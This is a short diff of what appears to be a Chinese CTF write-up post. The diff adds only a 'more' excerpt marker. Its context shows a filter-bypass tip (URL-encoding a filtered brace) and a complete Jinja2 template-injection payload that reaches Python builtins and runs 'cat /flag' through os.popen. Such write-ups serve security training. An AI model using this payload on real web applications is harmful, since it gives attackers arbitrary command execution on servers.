@@ -21,6 +21,8 @@ categories:
 
 测试过滤，非数字时{被过滤，使用url编码绕过即可
 
+<!--more-->
+
 ```
 paylaod:
 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()") }}{% endif %}{% endfor %}
